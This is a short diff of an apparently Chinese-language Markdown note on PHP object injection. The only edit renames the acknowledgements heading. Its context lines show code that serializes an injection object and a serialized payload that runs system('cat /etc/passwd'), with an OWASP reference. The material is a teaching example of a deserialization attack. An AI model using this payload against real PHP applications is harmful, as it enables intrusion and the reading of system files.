@@ -27,5 +27,7 @@ echo urlencode(serialize(new PHPObjectInjection));
 //'O:18:"PHPObjectInjection":1:{s:6:"inject";s:26:"system(\'cat+/etc/passwd\');";}'
 ```
 
-## 感谢
+## 致谢
 * https://www.owasp.org/index.php/PHP_Object_Injection
+
+
